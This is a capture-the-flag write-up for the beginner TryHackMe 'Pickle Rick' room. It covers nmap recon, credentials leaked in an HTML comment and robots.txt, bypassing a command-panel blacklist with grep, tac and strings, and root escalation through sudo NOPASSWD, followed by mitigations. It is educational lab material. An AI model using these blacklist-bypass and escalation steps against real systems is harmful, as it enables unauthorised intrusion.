# Pickle Rick — TryHackMe

Beginner-friendly Rick and Morty themed web machine. Goal: find three "Ingredients" files hidden behind web enumeration, command injection, and privilege escalation.

- Platform: TryHackMe
- Difficulty: Beginner
- Category: Web, Linux

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -oN scan.txt <TARGET_IP>
```

Open ports:

| Port | Service |
|---|---|
| 22/tcp | SSH (OpenSSH) |
| 80/tcp | HTTP (Apache) |

The web server is the main attack surface; SSH requires credentials we don't have yet.

## Web Enumeration

Opening the site shows a page hinting at Burp Suite (an intentional nudge from the room authors).

**View Page Source** (`Ctrl+U`) reveals a hidden HTML comment:

```html
<!-- Username: R1ckRul3s -->
```

**robots.txt** is publicly accessible and lists a disallowed path, which turns out to contain the plaintext password:

```bash
curl http://<TARGET_IP>/robots.txt
```

```
Wubbalubbadubdub
```

Credentials found:
- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

## Gaining Access

An SSH attempt with these credentials fails (as expected — they're for the web app, not the OS account):

```bash
ssh root@<TARGET_IP>
```

The credentials work on the web login at `portal.php`, which exposes a command panel with direct command execution (RCE).

### Command blacklist

`cat` (and several other common commands) is blocked by the panel:

```php
$blacklist = array('cat', 'more', 'less', 'head', 'tail', 'nano', 'vim', ...);
```

Workarounds to read file contents without a blacklisted command:

```bash
grep . filename
while read line; do echo $line; done < filename
strings filename
tac filename
```

## Exploitation

List the current directory and read the first ingredient:

```bash
ls
grep . Sup3rS3cretPickl3Ingred.txt
# or
tac Sup3rS3cretPickl3Ingred.txt
```

### Privilege Escalation

```bash
sudo -l
```

Output shows `(ALL) NOPASSWD: ALL` — a critical misconfiguration granting full control of the system as root without a password.

Locating the remaining ingredients:

```bash
sudo ls ../../../*
```

(`../../../` walks up three levels to `/`, then `*` lists everything — revealing the other two ingredient files.)

## Evidence

*(fill in with real output from your session — the three ingredient file paths and root shell proof)*

## Attack Narrative

The application leaks sensitive information through a client-side channel that should never carry secrets: an HTML comment holding a username, and a publicly reachable `robots.txt` entry holding a password. Those credentials unlock an admin command panel with direct OS command execution. A blacklist attempts to block dangerous commands but only covers exact command names, so alternative file-reading commands bypass it trivially. Privilege escalation is immediate due to an unrestricted `sudo` configuration (`NOPASSWD: ALL`).

## Lessons Learned

- Always check page source (`Ctrl+U`) and `robots.txt` early in web recon — both are common leak vectors for credentials and hidden paths.
- Command blacklists based on exact string matching are easy to bypass; validate/sanitize input properly instead.
- Run `sudo -l` immediately after gaining any shell — it's often the fastest path to privilege escalation.
- Never leave credentials in HTML comments or publicly reachable files.

## Web Recon Checklist

- [ ] `nmap -sV -sC -oN scan.txt <IP>`
- [ ] Open `http://<IP>` in a browser
- [ ] View Page Source (`Ctrl+U`) — comments, paths, credentials
- [ ] `http://<IP>/robots.txt`
- [ ] `http://<IP>/sitemap.xml`
- [ ] Directory bruteforce: `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
- [ ] Check every discovered path

## Mitigation

- Never leave credentials in HTML comments or publicly accessible files (`robots.txt`, JS bundles, etc.).
- Sanitize and validate all user input before passing it to a shell, and use allowlists instead of denylists for command execution features.
- Restrict `sudo`/SUID permissions to the strict minimum required for the account's function.

## Resources

- [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)
- [robots.txt explained](https://developers.google.com/search/docs/crawling-indexing/robots/intro)
